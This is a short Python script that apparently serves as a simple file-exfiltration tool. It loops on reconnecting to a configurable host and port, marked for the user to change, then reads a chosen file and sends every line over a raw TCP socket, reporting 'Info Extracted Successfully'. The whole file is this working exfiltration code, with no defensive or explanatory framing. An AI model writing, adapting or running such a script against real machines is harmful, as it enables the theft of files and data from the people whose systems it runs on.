import socket
import platform

ADDR = "127.0.0.1"		 # change	
PORT = 8080      		 # change
FILEPATH = r"file.txt"   # change

def connect():
	print("Connecting....")
	conn = s.connect_ex((ADDR, PORT))
	while conn != 0:
		conn = s.connect_ex((ADDR, PORT))
	print("Connected!")
	return 0

def main():
	if connect() == 0:
		file_shit = open(FILEPATH, "r").readlines()
		
		for shit in file_shit:
			if s.sendall(shit.encode()) is not None:
				return
			
		print("Info Extracted Successfully")
		s.close()
		return
	else:
		connect()


if __name__ == '__main__':
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		main()
		print("Waiting for new connection...")
